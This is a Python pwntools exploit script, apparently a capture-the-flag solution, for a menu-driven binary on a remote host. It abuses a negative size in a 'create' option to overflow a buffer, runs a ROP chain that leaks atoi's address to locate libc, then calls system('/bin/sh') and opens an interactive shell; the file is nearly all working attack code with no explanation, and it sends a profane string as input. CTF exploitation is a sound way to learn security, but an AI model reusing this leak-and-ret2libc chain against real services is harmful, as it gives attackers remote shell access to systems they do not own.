from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

libc = ELF('./ctflibc.so.6')
libc_atoi_addr = libc.symbols['atoi']
libc_sys_addr = libc.symbols['system']
libc_binsh_addr = next(libc.search(b'/bin/sh'))

elf = ELF('./pwn')
# io = process('./pwn')
io = remote('111.200.241.244', 54585)

def create(size, index, content):
	io.sendlineafter(b'$ ', b'1')
	io.sendlineafter(b'Input size\n', str(size).encode())
	io.sendlineafter(b'Input cun\n', str(index).encode())
	io.sendafter(b'Input content\n', content)

def delete(index):
	io.sendlineafter(b'$ ', b'2')
	io.sendlineafter(b'Chose one to dele\n', str(index).encode())

def edit(index, content):
	io.sendlineafter(b'$ ', b'3')
	io.sendlineafter(b'Chose one to edit\n', str(index).encode())
	io.sendafter(b'Input the content\n', content)

main_addr = 0x400C8C
pop_rdi_ret_addr = 0x400DA3
one_gadget_addr = 0x41EBC

io.recv()
io.sendline(b'go fucking shit name')
create(-1, 0, cyclic(0x80) + p64(0x6020E0) + p64(0) + cyclic(0x8) + \
			  p64(pop_rdi_ret_addr) + p64(elf.got['atoi']) + \
			  p64(elf.plt['puts']) + p64(main_addr))

io.sendline(b'go fucking shit name')
mem_atoi_addr = u64(io.recvuntil(b'Input')[0:6] + b'\x00' * 2)

libcs = LibcSearcher('atoi', mem_atoi_addr)
libc_atoi_addr = libcs.dump('atoi')
offset = mem_atoi_addr - libc_atoi_addr
mem_sys_addr = offset + libcs.dump('system')
mem_binsh_addr = offset + libcs.dump('str_bin_sh')
# offset = mem_atoi_addr - libc_atoi_addr
# mem_sys_addr = offset + libc_sys_addr
# mem_binsh_addr = offset + libc_binsh_addr
create(-1, 1, b'\x00' * 0x80 + p64(0x6020F0) + p64(0) + cyclic(0x8) + \
			  p64(pop_rdi_ret_addr) + p64(mem_binsh_addr) + \
			  p64(mem_sys_addr))
# print('***' + str(hex(mem_binsh_addr)) + '***')
# print('***' + str(hex(mem_sys_addr)) + '***')
io.interactive()
